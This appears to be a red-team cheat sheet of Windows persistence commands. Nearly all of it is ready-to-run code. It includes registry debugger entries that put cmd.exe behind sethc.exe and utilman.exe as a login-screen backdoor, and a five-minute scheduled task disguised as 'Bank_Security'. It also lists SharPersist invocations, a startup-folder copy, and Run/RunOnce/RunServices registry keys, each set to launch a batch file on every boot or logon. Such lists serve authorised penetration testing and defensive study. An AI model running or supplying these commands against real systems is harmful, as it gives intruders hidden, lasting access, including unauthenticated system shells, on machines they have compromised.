# windows-persistence
## reg persistence in windows

```bash
Persistence:
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
schtasks /create /f /sc minute /mo 5 /tn Bank_Security /tr "C:\Windows\Temp\AUTO_RECON.bat"
```

## sharp persistence
https://github.com/fireeye/SharPersist
```bash
SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -f "Bank_Security" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "hkcurun" -v "Bank_Security" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "hklmrun" -v "Bank_Security" -m add -o env
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "hklmrunonce" -v "Bank_Security" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "hklmrunonceex" -v "Bank_Security" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "hkcurunonce" -v "Bank_Security" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\AUTO_RECON.bat" -k "logonscript" -m add
```

## auto_recon 
STARTUP FOLDER Basic:
```bash
copy C:\Windows\Temp\AUTO_RECON.bat "C:\Users\Bank_Security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AUTO_RECON.bat"
```
## REGISTRY KEY:

```bash
## CURRENT USER:
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'Bank_Security' -Value 'C:\Windows\Temp\AUTO_RECON.bat'


## LOCAL MACHINE (Admin privilege needed):
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\AUTO_RECON.bat"
```
